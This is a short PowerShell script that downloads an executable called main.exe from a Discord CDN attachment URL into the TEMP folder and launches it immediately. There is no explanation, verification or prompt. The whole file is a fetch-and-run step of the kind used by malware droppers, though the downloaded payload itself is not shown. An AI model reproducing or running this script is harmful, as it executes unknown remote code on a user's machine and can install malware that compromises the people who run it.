$url = "https://cdn.discordapp.com/attachments/1239366779504164935/1239366912643829780/main.exe?ex=6642a9e2&is=66415862&hm=50cdee8e6e521e0d855ee428185efa3f26772e50e4d1826a2e45ecea04574398&"
$file = Join-Path $env:TEMP "main.exe"
Invoke-WebRequest -Uri $url -OutFile $file
Start-Process $file
